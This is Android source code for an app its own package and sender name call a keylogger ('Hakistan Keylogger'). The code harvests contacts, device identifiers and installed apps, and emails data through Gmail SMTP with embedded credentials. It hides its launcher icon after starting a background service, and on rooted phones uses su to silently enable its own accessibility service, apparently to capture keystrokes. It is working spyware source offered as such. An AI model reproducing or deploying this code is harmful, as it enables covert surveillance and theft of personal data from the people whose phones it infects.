package com.hak15tan.hakistankeylogger;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.scottyab.rootbeer.RootBeer;

import java.io.DataOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.List;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;

public class MainActivity extends AppCompatActivity {

    private static String username = "dashdashpass7@gmail.com";
    private static String password = "createpassword.";
    private static String recipient = "password";

    private static final String TAG = "MainActivity";

    private Cursor cursor;
    private boolean csv_status = false;
    private Button btn_sendmail;
    private Button btn_startservice;
    private Button btn_stopservice;
    private Button btnhide;
    private Button btn_hide_root;
    private TextView roottxet;
    private Multipart _multipart;

    public static final String MY_PREFS_NAME = "GPrefs";
    public static final String MY_PREFS_STRING_KEY = "GPrefsStringsKey";

    private String ContactsList = "\nList Of Contacts:\n";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        username=getResources().getString(R.string.EMail);
        password=getResources().getString(R.string.Password);


        btn_sendmail = findViewById(R.id.btn_sendmail);
        btn_startservice = findViewById(R.id.btn_startservice);
        btn_stopservice = findViewById(R.id.btn_stopservice);
        btnhide = findViewById(R.id.btn_hide);
        btn_hide_root = findViewById(R.id.btn_hide_root);
        roottxet = findViewById(R.id.roottxet);



        RootBeer rootBeer = new RootBeer(getApplicationContext());
        if (rootBeer.isRooted()) {
            //we found indication of root
            roottxet.setText("ROOTED!");
            roottxet.setTextColor(Color.GREEN);

        } else {
            //we didn't find indication of

            roottxet.setText("NOT ROOTED!");
            roottxet.setTextColor(Color.RED);

        }


        btn_startservice.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                 sendMail(username, "Test subject", "Fucking Test Completed!");


                // startService();

            }
        });

        btn_hide_root.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                (new Startup()).execute();

            }
        });

        btnhide.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {


                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);


               // PackageManager packageManager = getPackageManager();
                //first activity is this and second is launcher activity
               // ComponentName componentName = new ComponentName(MainActivity.this,MainActivity.class);

               // packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);

               // Toast.makeText(MainActivity.this, "App Hided!", Toast.LENGTH_SHORT).show();

            }
        });

        btn_stopservice.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

               // String email = getResources().getString(R.string.EMail);
               // String password = getResources().getString(R.string.Password);
                //Log.i("Gservice", email);
              //  Log.i("Gservice", password);

                startService();

                PackageManager packageManager = getPackageManager();
                //first activity is this and second is launcher activity
                ComponentName componentName = new ComponentName(MainActivity.this,MainActivity.class);

                packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);

                Toast.makeText(MainActivity.this, "App Hided!", Toast.LENGTH_SHORT).show();

                finish();


            }
        });

        btn_sendmail.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                ContentResolver contentResolver = getApplicationContext().getContentResolver();
                String enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
                String packageName = getApplicationContext().getPackageName();

                // check to see if the enabledNotificationListeners String contains our package name
                if (enabledNotificationListeners == null || !enabledNotificationListeners.contains(packageName))
                {

                    startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));

                    // in this situation we know that the user has not granted the app the Notification access permission
                    try {
                        throw new Exception();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                else
                {

                    Toast.makeText(getApplicationContext(),"Notification Access is Enabled!",Toast.LENGTH_LONG).show();
                    // doSomethingThatRequiresNotificationAccessPermission();
                }



            }
        });




    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        //stopService();

    }

    private String getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                       // Log.i(TAG, "Name: " + name);

                        ContactsList = ContactsList + phoneNo +"\n";

                      //  Log.i(TAG, "Phone Number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }

        Log.i(TAG, ContactsList);


        return ContactsList;
    }



    public String getSYSInfo(){

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        assert wm != null;
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        @SuppressLint("HardwareIds")
        String SystemData = "\nDevice Information: \n";


        SystemData = SystemData+ "VERSION.RELEASE : "+ Build.VERSION.RELEASE
                +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
                +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
                +"\nBOARD : "+Build.BOARD
                +"\nScreen Width : "+width
                +"\nScreen Height : "+height
                +"\nBOOTLOADER : "+Build.BOOTLOADER
                +"\nBRAND : "+Build.BRAND
                +"\nCPU_ABI : "+Build.CPU_ABI
                +"\nCPU_ABI2 : "+Build.CPU_ABI2
                +"\nDISPLAY : "+Build.DISPLAY
                +"\nFINGERPRINT : "+Build.FINGERPRINT
                +"\nHARDWARE : "+Build.HARDWARE
                +"\nHOST : "+ Build.HOST
                +"\nID : "+Build.ID
                +"\nMANUFACTURER : "+Build.MANUFACTURER
                +"\nMODEL : "+Build.MODEL
                +"\nPRODUCT : "+Build.PRODUCT
                +"\nSERIAL : "+Build.SERIAL
                +"\nTAGS : "+Build.TAGS
                //+"\nTIME : "+Build.TIME
                +"\nTYPE : "+Build.TYPE
                +"\nUNKNOWN : "+Build.UNKNOWN
                +"\nUSER : "+Build.USER
                + "\nANDROID ID : " + Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);


        // Log.i(TAG,details);

        ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());

        List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
        // String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);

        String InstalledAppsPkg = "";

        for (String item : arrayList){

            String ApplicationLabelName = apkInfoExtractor.GetAppName(item);

            InstalledAppsPkg= InstalledAppsPkg + ApplicationLabelName + " : " + item + "\n";


        }

        SystemData  = SystemData + "\n\nList Of Installed Apps:\n" + "App Name : Package Name\n" + InstalledAppsPkg + "\n";

       // Log.i(TAG, SystemData);

        return SystemData;
    }

    public void startService() {
        //String input = editTextInput.getText().toString();

        Intent serviceIntent = new Intent(this, Gservice.class);
        //serviceIntent.putExtra("inputExtra", "Alpha");

        ContextCompat.startForegroundService(this, serviceIntent);
    }

    public void stopService() {
        Intent serviceIntent = new Intent(this, Gservice.class);
        stopService(serviceIntent);
    }


    private void sendMail(String email, String subject, String messageBody)
    {
        Session session = createSessionObject();

        try {
            Message message = createMessage(email, subject, messageBody, session);
            new SendMailTask().execute(message);
        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public void addAttachment(String filename) throws Exception {
        BodyPart messageBodyPart = new MimeBodyPart();
        DataSource source = new FileDataSource(filename);
        messageBodyPart.setDataHandler(new DataHandler(source));
        messageBodyPart.setFileName(filename);

        _multipart.addBodyPart(messageBodyPart);
    }
    private Message createMessage(String email, String subject, String messageBody, Session session) throws MessagingException, UnsupportedEncodingException {
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress("keylogger@hakistan.org", "Hakistan Keylogger"));
        message.addRecipient(Message.RecipientType.TO, new InternetAddress(email, email));
        message.setSubject(subject);
        message.setText(messageBody);

        /*
        String filename = Environment.getExternalStorageDirectory().getAbsolutePath() + "/t.csv";
        if (!"".equals(filename)) {
            Multipart _multipart = new MimeMultipart();
            BodyPart messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(filename);

            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);

            _multipart.addBodyPart(messageBodyPart);
            message.setContent(_multipart);
        }

         */
        return message;
    }

    private Session createSessionObject() {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        return Session.getInstance(properties, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });
    }

    private class SendMailTask extends AsyncTask<Message, Void, Void> {
      //  private ProgressDialog progressDialog;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            Toast.makeText(getApplicationContext(),"Sending Email, Please Wait...",Toast.LENGTH_LONG).show();
        //    progressDialog = ProgressDialog.show(MainActivity.this, "Please wait", "Sending mail", true, false);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();

            //  progressDialog.dismiss();
        }

        @Override
        protected Void doInBackground(Message... messages) {
            try {
                Transport.send(messages[0]);
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }

    void enableAccessibility(){
        Log.d("MainActivity", "enableAccessibility");
        String PACKAGE_NAME = getApplicationContext().getPackageName();
        Log.d("MainActivity Packegr", PACKAGE_NAME);

        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {

                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services "+PACKAGE_NAME+"/"+PACKAGE_NAME+".KeyService\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }

}
